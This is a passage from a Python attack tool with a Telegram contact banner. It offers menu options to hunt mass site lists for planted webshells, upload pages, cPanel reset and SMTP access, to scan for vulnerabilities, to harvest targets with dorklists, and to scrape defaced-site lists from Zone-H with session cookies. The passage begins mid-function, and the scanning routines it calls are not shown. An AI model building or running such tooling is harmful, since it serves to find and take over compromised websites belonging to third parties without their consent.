$$$\  $$ |                      $$ |    $$ |          
$$$$\ $$ | $$$$$$\   $$$$$$$\ $$$$$$\   $$ | $$$$$$\  
$$ $$\$$ |$$  __$$\ $$  _____|\_$$  _|  $$ |$$  __$$\ 
$$ \$$$$ |$$$$$$$$ |\$$$$$$\    $$ |    $$ |$$$$$$$$ |
$$ |\$$$ |$$   ____| \____$$\   $$ |$$\ $$ |$$   ____|
$$ | \$$ |\$$$$$$$\ $$$$$$$  |  \$$$$  |$$ |\$$$$$$$\ 
\__|  \__| \_______|\_______/    \____/ \__| \_______|          
                                                                                                                                                                        
                                                                                                                                                     
Telegram Channel : @Rici144

        """)
    file_name = input('Sitelist >> : ')
    TEXTList = open(file_name, 'r').read().splitlines()
    print('Sitelist >> ' + fc + str(len(TEXTList)) + fw + ' start to scan list')
    p = Pool(int(input('Threads : ')))
    sleep(1)
    cleans()
    p.map(start, TEXTList)


def two():
    op = open(file_name, 'r', errors='ignore').read().splitlines()
    TEXTList = [list.strip() for list in op]
    listaa = open('x2.txt', 'r', errors='ignore').read().splitlines()
    p = Pool(int(500))
    p.map(finder, TEXTList)

def zonehh():
    print("""
        |---| Grabb Sites From Zone-h |--|
        \033[91m[1] \033[95mGrabb Sites By Notifier
        \033[91m[2] \033[95mGrabb Sites By Onhold
        """)
    sec = int(input("Choose Section: "))
    if sec == 1:
        notf = input("\033[95mEnter notifier: \033[92m")

        for i in range(1, 51):
            dz = requests.get(url + notf + "/page=" + str(i), cookies=my_cook)
            dzz = dz.content.decode('utf-8')
            print(url + notf + "/page=" + str(i))
            if '<html><body>-<script type="text/javascript"' in dzz:
                print("Change Cookies Please")
                sys.exit()
            elif '<input type="text" name="captcha" value=""><input type="submit">' in dzz:
                print("Enter Captcha In Zone-h From Ur Browser :/")
                sys.exit()
            else:
                Hunt_urls = re.findall('<td>(.*)\n </td>', dzz)
                if '/mirror/id/' in dzz:
                    for xx in Hunt_urls:
                        qqq = xx.replace('...', '')
                        print('    [' + '*' + '] ' + qqq.split('/')[0])
                        with open(notf + '.txt', 'a') as rr:
                            rr.write("http://" + qqq.split('/')[0] + '\n')
                else:
                    print("Grabb Sites Completed !!")
                    sys.exit()

    elif sec == 2:
        print(":* __Grabb Sites By Onhold__ ^_^")
        for qwd in range(1, 51):
            rb = requests.get(urll + "/page=" + str(qwd), cookies=my_cook)
            dzq = rb.content.decode('utf-8')

            if '<html><body>-<script type="text/javascript"' in dzq:
                print("Change Cookies Plz")
                sys.exit()

            elif "captcha" in dzq:
                print("Enter captcha In Your Browser Of Site [zone-h.org]")
            else:
                Hunt_urlss = re.findall('<td>(.*)\n </td>', dzq)
                for xxx in Hunt_urlss:
                    qqqq = xxx.replace('...', '')
                    print('    [' + '*' + '] ' + qqqq.split('/')[0])
                    with open('zone.txt', 'a') as rrr:
                        rrr.write("http://" + qqqq.split('/')[0] + '\n')
    else:
        print("Fuck You Men")
def main():
    print("""

$$\   $$\                       $$\     $$\           
$$$\  $$ |                      $$ |    $$ |          
$$$$\ $$ | $$$$$$\   $$$$$$$\ $$$$$$\   $$ | $$$$$$\  
$$ $$\$$ |$$  __$$\ $$  _____|\_$$  _|  $$ |$$  __$$\ 
$$ \$$$$ |$$$$$$$$ |\$$$$$$\    $$ |    $$ |$$$$$$$$ |
$$ |\$$$ |$$   ____| \____$$\   $$ |$$\ $$ |$$   ____|
$$ | \$$ |\$$$$$$$\ $$$$$$$  |  \$$$$  |$$ |\$$$$$$$\ 
\__|  \__| \_______|\_______/    \____/ \__| \_______|          
                                                                                                                                                                        
                                                                                                                                                     
Telegram Channel : @Rici144

""")
    print('1 >> [Full Finder] >> (Shell & Upload-Page & Cpanel Reset & SMTP & Symlink) \n2 >> [Auto Scan For Vuln]\n3 >> [SiteGrabber With Dorklist] \n4 >> [Zone-H Grabber] \n')
    inp = int(input('\nYour choice >> : '))
    if inp == 1:
        os.system('cls')
        run()
        two()
    else:
        if inp == 3:
            os.system('cls')
            ok()
        else:
            if inp == 2:
                os.system('cls')
                x1877()
            else:
                if inp == 4:
                    os.system('cls')
                    zonehh()
                
                  
                else:
                    exit()
if __name__ == '__main__':
  main()

main()
